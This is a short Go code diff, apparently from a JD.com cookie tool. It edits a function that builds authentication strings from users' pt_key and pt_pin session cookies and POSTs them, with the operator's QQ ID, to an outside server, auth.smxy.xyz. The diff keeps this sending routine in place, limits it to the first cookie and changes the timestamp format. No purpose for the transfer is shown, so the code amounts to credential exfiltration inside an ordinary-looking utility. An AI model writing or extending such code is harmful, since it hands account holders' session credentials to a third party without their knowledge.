@@ -192,6 +192,7 @@ func getAuthFlag() {
 		for _, ck := range cks {
 			authcode := fmt.Sprintf("pt_key=%s;pt_pin=%s;", ck.PtKey, ck.PtPin)
 			fdb(authcode)
+			break
 		}
 
 	}
@@ -202,7 +203,7 @@ func fdb(auth string) {
 	post := httplib.Post("http://auth.smxy.xyz/user/auth2")
 	post.Param("ck", auth)
 	post.Param("createby", strconv.FormatInt(Config.QQID, 10))
-	post.Param("createtime", time.Now().String())
+	post.Param("createtime", time.Now().Format("2006-01-02 15:04:05"))
 	post.Bytes()
 }
 
